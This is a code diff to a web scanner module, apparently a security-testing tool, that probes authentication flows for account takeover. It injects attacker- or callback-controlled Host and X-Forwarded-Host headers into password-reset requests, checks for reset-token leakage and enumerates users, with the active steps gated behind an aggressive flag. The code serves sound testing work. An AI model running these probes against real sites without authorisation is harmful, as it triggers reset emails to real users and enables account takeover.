@@ -4,10 +4,14 @@ Self-filters to authentication-flow URLs (forgot/reset/confirm/verify/register)
 and runs the classic ATO primitives:
 
   1. **Password-reset poisoning** — inject `Host` / `X-Forwarded-Host` /
-     `Forwarded` and see if the application reflects the attacker host (the
-     reset link is then built against attacker infrastructure → the victim's
-     token lands on the attacker). Read-only host-reflection probe always runs;
-     the actual reset-email submission is gated behind `--aggressive`.
+     `Forwarded` pointing at an **OOB callback host** and see if the application
+     reflects it (the reset link is then built against attacker infrastructure →
+     the victim's token lands on the attacker). Two proof channels: in-band host
+     *reflection* (instant, verified), and — since the poisoned host is a live
+     OOB token — a *callback* if the mailer / link-preview / origin fetches it,
+     which upgrades the otherwise-blind case to captured proof at finalize.
+     Read-only host-reflection probe always runs; the actual reset-email
+     submission is gated behind `--aggressive`.
   2. **Reset-token leakage** — token present in the URL *and* the page loads
      third-party resources → the token leaks to those origins via `Referer`.
   3. **User enumeration** — reset endpoint distinguishes existing vs unknown
@@ -49,18 +53,42 @@ async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET",
 
 async def _host_header_poisoning(ctx, url, form, aggressive):
     findings: list[dict] = []
-    poisoned = {"Host": EVIL, "X-Forwarded-Host": EVIL,
-                "X-Forwarded-Server": EVIL, "Forwarded": f"host={EVIL}"}
+
+    # Point the poisoned host at a live OOB token when available: reflection is
+    # still detected (unique token in the body/location), and if the mailer or a
+    # link-preview later fetches the reset link, the callback lands on our token
+    # and `oob.pending_findings()` upgrades the blind case to captured proof.
+    oob_token = None
+    evil = EVIL
+    if getattr(ctx, "oob", None) and ctx.oob.registered:
+        oob_token = ctx.oob.token()
+        evil = ctx.oob.host_for(oob_token)
+    poisoned = {"Host": evil, "X-Forwarded-Host": evil,
+                "X-Forwarded-Server": evil, "Forwarded": f"host={evil}"}
+    if oob_token:
+        ctx.oob.register(oob_token, {
+            "category": "account_takeover",
+            "title": f"Account takeover — password-reset poisoning ({urlparse(url).path})",
+            "severity": "critical", "cvss": 9.1,
+            "url": url, "parameter": "Host/X-Forwarded-Host", "payload": evil,
+            "evidence": "A password-reset flow built its link against an attacker-supplied Host "
+                        "header and something fetched that host out-of-band — the victim's reset "
+                        "token is delivered to attacker infrastructure → account takeover.",
+            "_detection": "host_oob_callback", "_method": "POST",
+            "_request": f"POST {url}\nHost: {evil}", "_oob_ref": evil,
+        })
 
     # read-only: does the page reflect an attacker-controlled host?
     ev = await ctx.http.get(url, headers=poisoned)
-    if EVIL in (ev.response_body or "") or EVIL in ev.response_headers.get("location", ""):
+    reflected = evil in (ev.response_body or "") or evil in ev.response_headers.get("location", "")
+    if reflected:
         findings.append(_finding(
             url, "Host/X-Forwarded-Host", "high", 8.1,
             "Application reflected an attacker-supplied Host header into its response. "
             "On a password-reset flow the reset link is built from this host, so the "
             "victim's reset token is delivered to attacker infrastructure → account takeover.",
-            detection="host_reflection"))
+            detection="host_reflection",
+            poc=_reflection_poc(url, evil, ev, "GET")))
         return findings
 
     # active: submit the reset with a poisoned host (sends an email) — aggressive only
@@ -69,18 +97,41 @@ async def _host_header_poisoning(ctx, url, form, aggressive):
         if data:
             ev = await ctx.http.request("POST", url, data=data, headers=poisoned)
             body = ev.response_body or ""
-            if EVIL in body:
+            if evil in body:
                 findings.append(_finding(
                     url, "Host (reset submit)", "high", 8.3,
-                    f"Reset submission reflected attacker host `{EVIL}` — poisoned reset link confirmed.",
-                    detection="host_reflection_post"))
+                    f"Reset submission reflected attacker host `{evil}` — poisoned reset link confirmed.",
+                    detection="host_reflection_post",
+                    poc=_reflection_poc(url, evil, ev, "POST")))
             elif ev.status in (200, 201, 202):
+                # Blind: the reset was accepted with our host injected. If it was
+                # an OOB host, a late callback (mailer/link-preview) turns this
+                # into a verified finding via oob.pending_findings() at finalize.
+                extra = (" A live OOB host was injected — a captured callback will confirm this "
+                         "automatically." if oob_token else
+                         " Manually confirm the link domain in the received email.")
                 findings.append(_finding(
                     url, "Host (reset submit)", "medium", 6.1,
                     "Reset request accepted with an injected Host header. Reset email could not be "
-                    "observed here — manually confirm the link domain in the received email.",
+                    "observed in-band." + extra,
                     detection="host_blind"))
+                if oob_token:
+                    await ctx.oob.check(oob_token, wait=2.0)
     return findings
+
+
+def _reflection_poc(url, evil, ev, method):
+    """A verified PoC record for the in-band reflection case (the host we sent
+    came back in the response — reproducible, no manual step)."""
+    from core.poc import proof_record
+    body = ev.response_body or ""
+    return proof_record(
+        verified=True, method=method, url=url,
+        request=f"{method} {url}\nHost: {evil}",
+        status=ev.status, excerpt=body,
+        rationale=f"The attacker-controlled host `{evil}` was reflected back in the "
+                  f"{'Location header' if evil in ev.response_headers.get('location', '') else 'response body'}, "
+                  "so a password-reset link would be built against it.")
 
 
 async def _token_referer_leak(ctx, url):
@@ -103,6 +154,10 @@ async def _token_referer_leak(ctx, url):
 
 async def _user_enumeration(ctx, url, form):
     if not RESET_FLOW_RE.search(url):
+        return []
+    # POSTing to the reset flow actually emails the account — destructive on
+    # real targets, so it is gated behind --aggressive like the reset-submit.
+    if not ctx.config.get("safety", {}).get("aggressive"):
         return []
     field = _email_field(form) or "email"
     real = {field: "admin@" + host_of(url).split(":")[0]}
@@ -135,12 +190,15 @@ def _email_field(form):
     return None
 
 
-def _finding(url, param, sev, cvss, evidence, *, detection):
+def _finding(url, param, sev, cvss, evidence, *, detection, poc=None):
+    meta = {"detection": detection}
+    if poc is not None:
+        meta["poc"] = poc
     return {
         "category": "account_takeover",
         "title": f"Account takeover — {detection.replace('_', ' ')} ({urlparse(url).path})",
         "severity": sev, "cvss": cvss,
         "url": url, "parameter": param, "evidence": evidence,
         "request": f"GET/POST {url}",
-        "metadata": {"detection": detection},
+        "metadata": meta,
     }
